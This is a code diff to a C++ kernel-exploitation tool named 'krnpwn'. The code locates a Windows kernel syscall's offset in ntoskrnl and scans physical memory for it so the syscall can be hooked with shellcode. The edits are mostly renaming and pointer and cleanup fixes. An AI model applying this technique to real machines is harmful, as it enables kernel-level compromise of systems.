@@ -25,14 +25,17 @@ namespace krnpwn
         ntoskrnl_local = ( uint8_t* )LoadLibraryExA( "ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
 
         // get offset for syscall we want to hook
-        ksyscall_rva = ( uint32_t )native::find_export( ( void* )ntoskrnl_local, syscall_func, true );
+        // clear warning for pointer truncation
+        // https://stackoverflow.com/questions/1640423/error-cast-from-void-to-int-loses-precision
+        void* tmp = native::find_export( ( void* )ntoskrnl_local, SYSCALL_FUNC, true );
+        ksyscall_rva = *( uint32_t* )&tmp;
 
-        log_info( syscall_func, "offset:", std::hex, ksyscall_rva );
+        log_info( SYSCALL_FUNC, "offset:", std::hex, ksyscall_rva );
 
         //  rva mod 4kb (0x1000) to get page offset of the function
         page_offset = ksyscall_rva % PAGE_4KB;
 
-        log_info( syscall_func, "page offset:", std::hex, page_offset, "\n" );
+        log_info( SYSCALL_FUNC, "page offset:", std::hex, page_offset, "\n" );
 
         // loop through the physical memory regions we found from the registry
         for( auto region : regions )
@@ -47,7 +50,7 @@ namespace krnpwn
 
         if( ksyscall_address != 0 )
         {
-            log_info( "found", syscall_func, "in physical memory:", std::hex, ksyscall_address, "\n" );
+            log_info( "found", SYSCALL_FUNC, "in physical memory:", std::hex, ksyscall_address, "\n" );
             initalised = true;
         }
         else
@@ -93,14 +96,16 @@ namespace krnpwn
             phys_dump_size = ( size - offset ) < phys_dump_size ? ( size - offset ) : phys_dump_size;
         }
 
-        VirtualFree( ( void* )phys_dump_data, NULL, MEM_RELEASE );
+        if( phys_dump_data )
+            VirtualFree( ( void* )phys_dump_data, NULL, MEM_RELEASE );
+
         return 0;
     }
 
     bool krnpwn::valid_ksyscall( uint64_t address )
     {
         // get the address of the usermode syscall
-        static const auto proc = native::find_export( LoadLibraryA( syscall_mod ), syscall_func );
+        static const auto proc = native::find_export( LoadLibraryA( syscall_mod ), SYSCALL_FUNC );
 
         // shellcode will simply output 0
         // this works because all syscalls return NTSTATUS as the result and most 
